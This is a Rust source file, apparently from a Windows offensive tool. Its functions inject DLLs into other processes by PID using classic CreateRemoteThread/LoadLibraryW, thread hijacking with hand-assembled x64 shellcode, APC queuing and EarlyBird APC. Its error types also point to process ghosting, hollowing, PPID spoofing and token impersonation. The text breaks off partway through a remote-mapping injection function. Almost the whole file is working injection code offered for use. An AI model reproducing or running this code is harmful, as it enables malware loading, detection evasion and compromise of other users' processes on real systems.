//! Miscellaneous process utilities

use std::ffi::CString;
use std::fmt;
use std::path::Path;

use ntapi::ntmmapi::{NtMapViewOfSection, NtUnmapViewOfSection};
use windows::core::PCSTR;
use windows::Win32::Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE, LUID};
use windows::Win32::System::Diagnostics::Debug::{
    GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory, CONTEXT,
    CONTEXT_FULL_AMD64,
};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::{
    CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, VirtualAllocEx, VirtualFreeEx,
    VirtualProtectEx, FILE_MAP_WRITE, MEM_COMMIT, MEM_DECOMMIT, MEM_RELEASE, MEM_RESERVE,
    PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY,
    PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY,
};
use windows::Win32::System::Threading::{
    CreateProcessAsUserW, CreateProcessW, CreateRemoteThread, DeleteProcThreadAttributeList,
    GetCurrentProcess, GetProcessId, InitializeProcThreadAttributeList, OpenProcess, OpenThread,
    OpenProcessToken, QueueUserAPC, ResumeThread, SuspendThread, TerminateProcess,
    UpdateProcThreadAttribute, WaitForSingleObject, CREATE_SUSPENDED, EXTENDED_STARTUPINFO_PRESENT,
    LPPROC_THREAD_ATTRIBUTE_LIST, PROCESS_ALL_ACCESS, PROCESS_CREATE_THREAD,
    PROCESS_INFORMATION, PROCESS_QUERY_INFORMATION, PROCESS_QUERY_LIMITED_INFORMATION,
    PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, STARTUPINFOEXW, STARTUPINFOW,
    THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
};
use windows::Win32::Security::{
    AdjustTokenPrivileges, DuplicateTokenEx, ImpersonateLoggedOnUser, RevertToSelf,
    SecurityAnonymous, TokenPrimary, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES,
    TOKEN_ASSIGN_PRIMARY, TOKEN_DUPLICATE, TOKEN_PRIVILEGES, TOKEN_QUERY,
};

/// Errors that can occur during misc operations.
#[derive(Debug)]
pub enum MiscError {
    FileNotFound(String),
    OpenProcessFailed(u32),
    AllocFailed,
    WriteFailed,
    ReadFailed,
    GetModuleHandleFailed,
    GetProcAddressFailed,
    CreateRemoteThreadFailed,
    Timeout,
    UnloadFailed,
    ThreadEnumerationFailed,
    NoThreadFound(u32),
    OpenThreadFailed(u32),
    SuspendThreadFailed(u32),
    GetContextFailed,
    SetContextFailed,
    ResumeThreadFailed(u32),
    FileReadFailed(String),
    InvalidPE(String),
    CommitFailed(String),
    DecommitFailed(String),
    FreeFailed(String),
    QueueApcFailed,
    CreateProcessFailed(String),
    OpenTokenFailed(u32),
    DuplicateTokenFailed,
    AdjustPrivilegesFailed,
    ImpersonateFailed,
    CreateProcessAsUserFailed(String),
    NtQueryFailed,
    NtUnmapFailed,
    PebReadFailed,
    ArchMismatch(String),
    GhostFileFailed(String),
    GhostSectionFailed,
    GhostNtCreateProcessFailed,
    GhostSetupFailed(String),
    PPidSpoofFailed(String),
}

impl fmt::Display for MiscError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            MiscError::FileNotFound(path) => write!(f, "File not found: {}", path),
            MiscError::OpenProcessFailed(pid) => write!(f, "Failed to open process {}", pid),
            MiscError::AllocFailed => write!(f, "Failed to allocate memory in target process"),
            MiscError::WriteFailed => write!(f, "Failed to write to target process memory"),
            MiscError::ReadFailed => write!(f, "Failed to read from target process memory"),
            MiscError::GetModuleHandleFailed => write!(f, "Failed to get kernel32.dll handle"),
            MiscError::GetProcAddressFailed => write!(f, "Failed to get LoadLibraryW address"),
            MiscError::CreateRemoteThreadFailed => write!(f, "Failed to create remote thread"),
            MiscError::Timeout => write!(f, "Remote thread timed out (10s)"),
            MiscError::UnloadFailed => write!(f, "Failed to unload module"),
            MiscError::ThreadEnumerationFailed => {
                write!(f, "Failed to enumerate threads (CreateToolhelp32Snapshot)")
            }
            MiscError::NoThreadFound(pid) => {
                write!(f, "No enumerable thread found for process {}", pid)
            }
            MiscError::OpenThreadFailed(tid) => write!(f, "Failed to open thread {}", tid),
            MiscError::SuspendThreadFailed(tid) => write!(f, "Failed to suspend thread {}", tid),
            MiscError::GetContextFailed => write!(f, "Failed to get thread context"),
            MiscError::SetContextFailed => write!(f, "Failed to set thread context"),
            MiscError::ResumeThreadFailed(tid) => write!(f, "Failed to resume thread {}", tid),
            MiscError::FileReadFailed(path) => write!(f, "Failed to read file: {}", path),
            MiscError::InvalidPE(msg) => write!(f, "Invalid PE file: {}", msg),
            MiscError::CommitFailed(msg) => write!(f, "Failed to commit memory: {}", msg),
            MiscError::DecommitFailed(msg) => write!(f, "Failed to decommit memory: {}", msg),
            MiscError::FreeFailed(msg) => write!(f, "Failed to free memory: {}", msg),
            MiscError::QueueApcFailed => {
                write!(f, "Failed to queue APC on any thread in target process")
            }
            MiscError::CreateProcessFailed(msg) => write!(f, "Failed to create process: {}", msg),
            MiscError::OpenTokenFailed(pid) => {
                write!(f, "Failed to open process token for PID {}", pid)
            }
            MiscError::DuplicateTokenFailed => write!(f, "Failed to duplicate token"),
            MiscError::AdjustPrivilegesFailed => write!(f, "Failed to adjust token privileges"),
            MiscError::ImpersonateFailed => write!(f, "Failed to impersonate logged on user"),
            MiscError::CreateProcessAsUserFailed(msg) => {
                write!(f, "Failed to create process as user: {}", msg)
            }
            MiscError::NtQueryFailed => write!(f, "NtQueryInformationProcess failed"),
            MiscError::NtUnmapFailed => write!(f, "NtUnmapViewOfSection failed"),
            MiscError::PebReadFailed => write!(f, "Failed to read/write PEB"),
            MiscError::ArchMismatch(msg) => write!(f, "Architecture mismatch: {}", msg),
            MiscError::GhostFileFailed(msg) => write!(f, "Ghost file operation failed: {}", msg),
            MiscError::GhostSectionFailed => write!(f, "Failed to create image section from ghost file"),
            MiscError::GhostNtCreateProcessFailed => write!(f, "NtCreateProcessEx failed"),
            MiscError::GhostSetupFailed(msg) => write!(f, "Ghost process setup failed: {}", msg),
            MiscError::PPidSpoofFailed(msg) => write!(f, "PPID spoofing failed: {}", msg),
        }
    }
}

impl std::error::Error for MiscError {}

/// Inject a DLL into a target process by PID.
///
/// Uses the classic `OpenProcess` -> `VirtualAllocEx` -> `WriteProcessMemory` ->
/// `CreateRemoteThread` + `LoadLibraryW` technique.
///
/// # Safety
/// This function uses unsafe Windows API calls to manipulate another process's memory.
pub fn inject_dll(pid: u32, dll_path: &str) -> Result<(), MiscError> {
    // Validate DLL exists
    if !Path::new(dll_path).exists() {
        return Err(MiscError::FileNotFound(dll_path.to_string()));
    }

    // Encode DLL path as wide string (UTF-16) with null terminator
    let wide_path: Vec<u16> = dll_path.encode_utf16().chain(std::iter::once(0)).collect();
    let wide_path_bytes = wide_path.len() * std::mem::size_of::<u16>();

    unsafe {
        // Open target process with required permissions
        let process_handle = OpenProcess(
            PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION
                | PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_VM_WRITE,
            false,
            pid,
        )
        .map_err(|_| MiscError::OpenProcessFailed(pid))?;

        // Allocate memory in target process for the DLL path
        let remote_mem = VirtualAllocEx(
            process_handle,
            Some(std::ptr::null()),
            wide_path_bytes,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_mem.is_null() {
            let _ = CloseHandle(process_handle);
            return Err(MiscError::AllocFailed);
        }

        // Write the DLL path into the allocated memory
        let write_result = WriteProcessMemory(
            process_handle,
            remote_mem,
            wide_path.as_ptr() as *const _,
            wide_path_bytes,
            None,
        );

        if write_result.is_err() {
            let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::WriteFailed);
        }

        // Resolve LoadLibraryW address from kernel32.dll
        let kernel32_name = CString::new("kernel32.dll").unwrap();
        let kernel32 =
            GetModuleHandleA(PCSTR(kernel32_name.as_ptr() as *const u8)).map_err(|_| {
                let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
                let _ = CloseHandle(process_handle);
                MiscError::GetModuleHandleFailed
            })?;

        let load_library_name = CString::new("LoadLibraryW").unwrap();
        let load_library_addr =
            GetProcAddress(kernel32, PCSTR(load_library_name.as_ptr() as *const u8));

        let load_library_addr = match load_library_addr {
            Some(addr) => addr,
            None => {
                let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
                let _ = CloseHandle(process_handle);
                return Err(MiscError::GetProcAddressFailed);
            }
        };

        // Cast LoadLibraryW address to the thread start routine type
        let thread_start: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
            std::mem::transmute(load_library_addr);

        // Create a remote thread in the target process that calls LoadLibraryW
        let thread_handle = CreateRemoteThread(
            process_handle,
            None,
            0,
            Some(thread_start),
            Some(remote_mem),
            0,
            None,
        )
        .map_err(|_| {
            let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
            let _ = CloseHandle(process_handle);
            MiscError::CreateRemoteThreadFailed
        })?;

        // Wait for the remote thread to finish (10 second timeout)
        let wait_result = WaitForSingleObject(thread_handle, 10_000);

        let _ = CloseHandle(thread_handle);
        let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
        let _ = CloseHandle(process_handle);

        // WAIT_OBJECT_0 = 0, WAIT_TIMEOUT = 258
        if wait_result.0 != 0 {
            return Err(MiscError::Timeout);
        }

        Ok(())
    }
}

/// Unload a DLL from a target process by calling FreeLibrary remotely.
///
/// Uses `OpenProcess` -> `CreateRemoteThread` + `FreeLibrary` with the module
/// base address as the HMODULE argument.
///
/// # Safety
/// This function uses unsafe Windows API calls to manipulate another process.
pub fn unload_module(pid: u32, base_address: usize) -> Result<(), MiscError> {
    unsafe {
        // Open target process with required permissions
        let process_handle = OpenProcess(
            PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION
                | PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_VM_WRITE,
            false,
            pid,
        )
        .map_err(|_| MiscError::OpenProcessFailed(pid))?;

        // Resolve FreeLibrary address from kernel32.dll
        let kernel32_name = CString::new("kernel32.dll").unwrap();
        let kernel32 =
            GetModuleHandleA(PCSTR(kernel32_name.as_ptr() as *const u8)).map_err(|_| {
                let _ = CloseHandle(process_handle);
                MiscError::GetModuleHandleFailed
            })?;

        let free_library_name = CString::new("FreeLibrary").unwrap();
        let free_library_addr =
            GetProcAddress(kernel32, PCSTR(free_library_name.as_ptr() as *const u8));

        let free_library_addr = match free_library_addr {
            Some(addr) => addr,
            None => {
                let _ = CloseHandle(process_handle);
                return Err(MiscError::GetProcAddressFailed);
            }
        };

        // Cast FreeLibrary address to the thread start routine type
        let thread_start: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
            std::mem::transmute(free_library_addr);

        // Create a remote thread that calls FreeLibrary with the module base address
        let thread_handle = CreateRemoteThread(
            process_handle,
            None,
            0,
            Some(thread_start),
            Some(base_address as *const std::ffi::c_void),
            0,
            None,
        )
        .map_err(|_| {
            let _ = CloseHandle(process_handle);
            MiscError::CreateRemoteThreadFailed
        })?;

        // Wait for the remote thread to finish (10 second timeout)
        let wait_result = WaitForSingleObject(thread_handle, 10_000);

        let _ = CloseHandle(thread_handle);
        let _ = CloseHandle(process_handle);

        if wait_result.0 != 0 {
            return Err(MiscError::Timeout);
        }

        Ok(())
    }
}

/// Inject a DLL into a target process using thread hijacking.
///
/// Suspends an existing thread, saves its context, redirects execution to shellcode
/// that calls `LoadLibraryW`, then restores original execution flow.
///
/// # Safety
/// This function uses unsafe Windows API calls to manipulate another process's threads.
pub fn inject_dll_thread_hijack(pid: u32, dll_path: &str) -> Result<(), MiscError> {
    // Validate DLL exists
    if !Path::new(dll_path).exists() {
        return Err(MiscError::FileNotFound(dll_path.to_string()));
    }

    // Encode DLL path as wide string (UTF-16) with null terminator
    let wide_path: Vec<u16> = dll_path.encode_utf16().chain(std::iter::once(0)).collect();
    let wide_path_bytes = wide_path.len() * std::mem::size_of::<u16>();

    unsafe {
        // Open target process with full permissions
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
            .map_err(|_| MiscError::OpenProcessFailed(pid))?;

        // Enumerate threads via CreateToolhelp32Snapshot to find a thread in the target process
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0).map_err(|_| {
            let _ = CloseHandle(process_handle);
            MiscError::ThreadEnumerationFailed
        })?;

        let mut thread_entry = THREADENTRY32 {
            dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
            ..Default::default()
        };

        let mut target_tid: Option<u32> = None;

        if Thread32First(snapshot, &mut thread_entry).is_ok() {
            loop {
                if thread_entry.th32OwnerProcessID == pid {
                    target_tid = Some(thread_entry.th32ThreadID);
                    break;
                }
                thread_entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
                if Thread32Next(snapshot, &mut thread_entry).is_err() {
                    break;
                }
            }
        }

        let _ = CloseHandle(snapshot);

        let tid = match target_tid {
            Some(t) => t,
            None => {
                let _ = CloseHandle(process_handle);
                return Err(MiscError::NoThreadFound(pid));
            }
        };

        // Open the target thread
        let thread_handle = OpenThread(
            THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
            false,
            tid,
        )
        .map_err(|_| {
            let _ = CloseHandle(process_handle);
            MiscError::OpenThreadFailed(tid)
        })?;

        // Suspend the thread
        let suspend_result = SuspendThread(thread_handle);
        if suspend_result == u32::MAX {
            let _ = CloseHandle(thread_handle);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::SuspendThreadFailed(tid));
        }

        // Get thread context (save original RIP)
        let mut context: CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_FULL_AMD64;

        if GetThreadContext(thread_handle, &mut context).is_err() {
            let _ = ResumeThread(thread_handle);
            let _ = CloseHandle(thread_handle);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::GetContextFailed);
        }

        let original_rip = context.Rip;

        // Allocate remote memory for DLL path + shellcode
        // Layout: [DLL path (wide_path_bytes)] [shellcode (~80 bytes)]
        let shellcode_offset = wide_path_bytes;
        let total_size = shellcode_offset + 128; // generous buffer for shellcode

        let remote_mem = VirtualAllocEx(
            process_handle,
            Some(std::ptr::null()),
            total_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_mem.is_null() {
            let _ = ResumeThread(thread_handle);
            let _ = CloseHandle(thread_handle);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::AllocFailed);
        }

        let dll_path_ptr = remote_mem as u64;
        let shellcode_ptr = (remote_mem as u64) + shellcode_offset as u64;

        // Write UTF-16 DLL path to remote memory
        if WriteProcessMemory(
            process_handle,
            remote_mem,
            wide_path.as_ptr() as *const _,
            wide_path_bytes,
            None,
        )
        .is_err()
        {
            let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
            let _ = ResumeThread(thread_handle);
            let _ = CloseHandle(thread_handle);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::WriteFailed);
        }

        // Resolve LoadLibraryW address
        let kernel32_name = CString::new("kernel32.dll").unwrap();
        let kernel32 =
            GetModuleHandleA(PCSTR(kernel32_name.as_ptr() as *const u8)).map_err(|_| {
                let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
                let _ = ResumeThread(thread_handle);
                let _ = CloseHandle(thread_handle);
                let _ = CloseHandle(process_handle);
                MiscError::GetModuleHandleFailed
            })?;

        let load_library_name = CString::new("LoadLibraryW").unwrap();
        let load_library_addr =
            GetProcAddress(kernel32, PCSTR(load_library_name.as_ptr() as *const u8));

        let load_library_addr = match load_library_addr {
            Some(addr) => addr as usize as u64,
            None => {
                let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
                let _ = ResumeThread(thread_handle);
                let _ = CloseHandle(thread_handle);
                let _ = CloseHandle(process_handle);
                return Err(MiscError::GetProcAddressFailed);
            }
        };

        // Build x64 shellcode
        // Fixes: proper RFLAGS save, stack alignment, shadow space placement,
        // and register-clean return via xchg+ret.
        let mut shellcode: Vec<u8> = Vec::new();

        // pushfq - save RFLAGS (must be first, before any flag-modifying instructions)
        shellcode.push(0x9C);

        // Save volatile registers (7 pushes)
        shellcode.push(0x50); // push rax
        shellcode.push(0x51); // push rcx
        shellcode.push(0x52); // push rdx
        shellcode.extend_from_slice(&[0x41, 0x50]); // push r8
        shellcode.extend_from_slice(&[0x41, 0x51]); // push r9
        shellcode.extend_from_slice(&[0x41, 0x52]); // push r10
        shellcode.extend_from_slice(&[0x41, 0x53]); // push r11

        // Save rbp (non-volatile) so we can use it as frame pointer to restore RSP later
        shellcode.push(0x55); // push rbp
        shellcode.extend_from_slice(&[0x48, 0x89, 0xE5]); // mov rbp, rsp

        // Align stack to 16 bytes, then allocate 0x20 shadow space
        shellcode.extend_from_slice(&[0x48, 0x83, 0xE4, 0xF0]); // and rsp, -16
        shellcode.extend_from_slice(&[0x48, 0x83, 0xEC, 0x20]); // sub rsp, 0x20

        // mov rcx, <dll_path_ptr> (LoadLibraryW argument)
        shellcode.extend_from_slice(&[0x48, 0xB9]);
        shellcode.extend_from_slice(&dll_path_ptr.to_le_bytes());

        // mov rax, <LoadLibraryW_addr>
        shellcode.extend_from_slice(&[0x48, 0xB8]);
        shellcode.extend_from_slice(&load_library_addr.to_le_bytes());

        // call rax
        shellcode.extend_from_slice(&[0xFF, 0xD0]);

        // Restore RSP from frame pointer
        shellcode.extend_from_slice(&[0x48, 0x89, 0xEC]); // mov rsp, rbp

        // Restore rbp
        shellcode.push(0x5D); // pop rbp

        // Restore volatile registers (reverse order)
        shellcode.extend_from_slice(&[0x41, 0x5B]); // pop r11
        shellcode.extend_from_slice(&[0x41, 0x5A]); // pop r10
        shellcode.extend_from_slice(&[0x41, 0x59]); // pop r9
        shellcode.extend_from_slice(&[0x41, 0x58]); // pop r8
        shellcode.push(0x5A); // pop rdx
        shellcode.push(0x59); // pop rcx
        shellcode.push(0x58); // pop rax

        // popfq - restore RFLAGS
        shellcode.push(0x9D);

        // Jump to original RIP without clobbering any register:
        // push rax (temp save), mov rax <original_rip>, xchg [rsp] rax (swap), ret
        shellcode.push(0x50); // push rax
        shellcode.extend_from_slice(&[0x48, 0xB8]); // mov rax, <original_rip>
        shellcode.extend_from_slice(&original_rip.to_le_bytes());
        shellcode.extend_from_slice(&[0x48, 0x87, 0x04, 0x24]); // xchg [rsp], rax
        shellcode.push(0xC3); // ret

        // Write shellcode to remote memory
        if WriteProcessMemory(
            process_handle,
            (remote_mem as usize + shellcode_offset) as *const _,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            None,
        )
        .is_err()
        {
            let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
            let _ = ResumeThread(thread_handle);
            let _ = CloseHandle(thread_handle);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::WriteFailed);
        }

        // Redirect thread to our shellcode
        context.Rip = shellcode_ptr;

        if SetThreadContext(thread_handle, &context).is_err() {
            let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
            let _ = ResumeThread(thread_handle);
            let _ = CloseHandle(thread_handle);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::SetContextFailed);
        }

        // Resume the thread
        let resume_result = ResumeThread(thread_handle);
        if resume_result == u32::MAX {
            let _ = CloseHandle(thread_handle);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::ResumeThreadFailed(tid));
        }

        // NOTE: We intentionally do NOT free remote_mem here.
        // The hijacked thread runs asynchronously - we have no way to know when the
        // shellcode has finished executing. Freeing the memory while the thread is
        // still running (or hasn't been scheduled yet) would cause a crash.
        // The allocation is small (DLL path + ~80 bytes shellcode) and is an
        // acceptable trade-off for stability.
        let _ = CloseHandle(thread_handle);
        let _ = CloseHandle(process_handle);

        Ok(())
    }
}

/// Inject a DLL into a target process using APC queue.
///
/// Writes the DLL path into the target process, resolves `LoadLibraryW`, then
/// queues an APC on every thread belonging to the process. The DLL loads when
/// any queued thread enters an alertable wait state.
///
/// # Safety
/// This function uses unsafe Windows API calls to manipulate another process.
pub fn inject_dll_apc_queue(pid: u32, dll_path: &str) -> Result<(), MiscError> {
    // Validate DLL exists
    if !Path::new(dll_path).exists() {
        return Err(MiscError::FileNotFound(dll_path.to_string()));
    }

    // Encode DLL path as wide string (UTF-16) with null terminator
    let wide_path: Vec<u16> = dll_path.encode_utf16().chain(std::iter::once(0)).collect();
    let wide_path_bytes = wide_path.len() * std::mem::size_of::<u16>();

    unsafe {
        // Open target process with required permissions
        let process_handle = OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
            false,
            pid,
        )
        .map_err(|_| MiscError::OpenProcessFailed(pid))?;

        // Allocate memory in target process for the DLL path
        let remote_mem = VirtualAllocEx(
            process_handle,
            Some(std::ptr::null()),
            wide_path_bytes,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_mem.is_null() {
            let _ = CloseHandle(process_handle);
            return Err(MiscError::AllocFailed);
        }

        // Write the DLL path into the allocated memory
        if WriteProcessMemory(
            process_handle,
            remote_mem,
            wide_path.as_ptr() as *const _,
            wide_path_bytes,
            None,
        )
        .is_err()
        {
            let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::WriteFailed);
        }

        // Resolve LoadLibraryW address from kernel32.dll
        let kernel32_name = CString::new("kernel32.dll").unwrap();
        let kernel32 =
            GetModuleHandleA(PCSTR(kernel32_name.as_ptr() as *const u8)).map_err(|_| {
                let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
                let _ = CloseHandle(process_handle);
                MiscError::GetModuleHandleFailed
            })?;

        let load_library_name = CString::new("LoadLibraryW").unwrap();
        let load_library_addr =
            GetProcAddress(kernel32, PCSTR(load_library_name.as_ptr() as *const u8));

        let load_library_addr = match load_library_addr {
            Some(addr) => addr as usize,
            None => {
                let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
                let _ = CloseHandle(process_handle);
                return Err(MiscError::GetProcAddressFailed);
            }
        };

        // Enumerate all threads via CreateToolhelp32Snapshot
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0).map_err(|_| {
            let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
            let _ = CloseHandle(process_handle);
            MiscError::ThreadEnumerationFailed
        })?;

        let mut thread_entry = THREADENTRY32 {
            dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
            ..Default::default()
        };

        let mut queued_count: u32 = 0;

        if Thread32First(snapshot, &mut thread_entry).is_ok() {
            loop {
                if thread_entry.th32OwnerProcessID == pid {
                    if let Ok(thread_handle) =
                        OpenThread(THREAD_SET_CONTEXT, false, thread_entry.th32ThreadID)
                    {
                        // Cast LoadLibraryW to the APC function type
                        let apc_func: unsafe extern "system" fn(usize) =
                            std::mem::transmute(load_library_addr);

                        if QueueUserAPC(
                            Some(apc_func),
                            thread_handle,
                            remote_mem as usize,
                        ) != 0
                        {
                            queued_count += 1;
                        }
                        let _ = CloseHandle(thread_handle);
                    }
                }
                thread_entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
                if Thread32Next(snapshot, &mut thread_entry).is_err() {
                    break;
                }
            }
        }

        let _ = CloseHandle(snapshot);

        if queued_count == 0 {
            let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::QueueApcFailed);
        }

        // NOTE: We intentionally do NOT free remote_mem here.
        // The DLL path must persist in the target process until an APC fires
        // and LoadLibraryW reads the path string.
        let _ = CloseHandle(process_handle);

        Ok(())
    }
}

/// Inject a DLL into a target process using the EarlyBird APC technique.
///
/// Creates a remote thread in suspended state, queues an APC with `LoadLibraryW`
/// before the thread runs, then resumes it. The APC fires during thread initialization
/// (in `LdrInitializeThunk`) before the entry point executes, guaranteeing execution
/// without waiting for an alertable wait state.
///
/// # Safety
/// This function uses unsafe Windows API calls to manipulate another process.
pub fn inject_dll_earlybird(pid: u32, dll_path: &str) -> Result<(), MiscError> {
    // Validate DLL exists
    if !Path::new(dll_path).exists() {
        return Err(MiscError::FileNotFound(dll_path.to_string()));
    }

    // Encode DLL path as wide string (UTF-16) with null terminator
    let wide_path: Vec<u16> = dll_path.encode_utf16().chain(std::iter::once(0)).collect();
    let wide_path_bytes = wide_path.len() * std::mem::size_of::<u16>();

    unsafe {
        // Open target process with required permissions
        let process_handle = OpenProcess(
            PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION
                | PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_VM_WRITE,
            false,
            pid,
        )
        .map_err(|_| MiscError::OpenProcessFailed(pid))?;

        // Allocate memory in target process for the DLL path
        let remote_mem = VirtualAllocEx(
            process_handle,
            Some(std::ptr::null()),
            wide_path_bytes,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_mem.is_null() {
            let _ = CloseHandle(process_handle);
            return Err(MiscError::AllocFailed);
        }

        // Write the DLL path into the allocated memory
        if WriteProcessMemory(
            process_handle,
            remote_mem,
            wide_path.as_ptr() as *const _,
            wide_path_bytes,
            None,
        )
        .is_err()
        {
            let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::WriteFailed);
        }

        // Resolve kernel32.dll function addresses
        let kernel32_name = CString::new("kernel32.dll").unwrap();
        let kernel32 =
            GetModuleHandleA(PCSTR(kernel32_name.as_ptr() as *const u8)).map_err(|_| {
                let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
                let _ = CloseHandle(process_handle);
                MiscError::GetModuleHandleFailed
            })?;

        // Resolve LoadLibraryW (APC callback)
        let load_library_name = CString::new("LoadLibraryW").unwrap();
        let load_library_addr =
            GetProcAddress(kernel32, PCSTR(load_library_name.as_ptr() as *const u8));

        let load_library_addr = match load_library_addr {
            Some(addr) => addr,
            None => {
                let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
                let _ = CloseHandle(process_handle);
                return Err(MiscError::GetProcAddressFailed);
            }
        };

        // Resolve ExitThread (benign thread entry point — thread exits after APC fires)
        let exit_thread_name = CString::new("ExitThread").unwrap();
        let exit_thread_addr =
            GetProcAddress(kernel32, PCSTR(exit_thread_name.as_ptr() as *const u8));

        let exit_thread_addr = match exit_thread_addr {
            Some(addr) => addr,
            None => {
                let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
                let _ = CloseHandle(process_handle);
                return Err(MiscError::GetProcAddressFailed);
            }
        };

        // Create a remote thread in SUSPENDED state with ExitThread as entry point.
        // The actual DLL load happens via the APC queued below, which fires during
        // thread initialization before the entry point executes.
        let thread_start: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
            std::mem::transmute(exit_thread_addr);

        let thread_handle = CreateRemoteThread(
            process_handle,
            None,
            0,
            Some(thread_start),
            None, // ExitThread(0)
            CREATE_SUSPENDED.0, // Thread starts suspended
            None,
        )
        .map_err(|_| {
            let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
            let _ = CloseHandle(process_handle);
            MiscError::CreateRemoteThreadFailed
        })?;

        // Queue APC with LoadLibraryW on the suspended thread.
        // When the thread resumes, LdrInitializeThunk processes the APC queue
        // before reaching the entry point, triggering LoadLibraryW(dll_path).
        let apc_func: unsafe extern "system" fn(usize) =
            std::mem::transmute(load_library_addr as usize);

        if QueueUserAPC(Some(apc_func), thread_handle, remote_mem as usize) == 0 {
            // APC queue failed — resume and discard the thread
            let _ = ResumeThread(thread_handle);
            let _ = CloseHandle(thread_handle);
            let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::QueueApcFailed);
        }

        // Resume the thread — APC fires during thread initialization
        if ResumeThread(thread_handle) == u32::MAX {
            let _ = CloseHandle(thread_handle);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::ResumeThreadFailed(0));
        }

        // Wait for the thread to finish (LoadLibraryW via APC, then ExitThread)
        let wait_result = WaitForSingleObject(thread_handle, 10_000);

        let _ = CloseHandle(thread_handle);
        let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
        let _ = CloseHandle(process_handle);

        if wait_result.0 != 0 {
            return Err(MiscError::Timeout);
        }

        Ok(())
    }
}

/// Inject a DLL into a target process using remote mapping injection.
///
/// Creates an anonymous file mapping, maps it locally to write the DLL path, then
/// maps the same section into the remote process via `NtMapViewOfSection`. This avoids
/// `VirtualAllocEx` / `WriteProcessMemory` entirely — the DLL path is shared through
/// a memory-mapped section. A remote thread then calls `LoadLibraryW` on the mapped address.
///
/// # Safety
/// This function uses unsafe Windows API calls to manipulate another process.
pub fn inject_dll_remote_mapping(pid: u32, dll_path: &str) -> Result<(), MiscError> {
    // Validate DLL exists
    if !Path::new(dll_path).exists() {
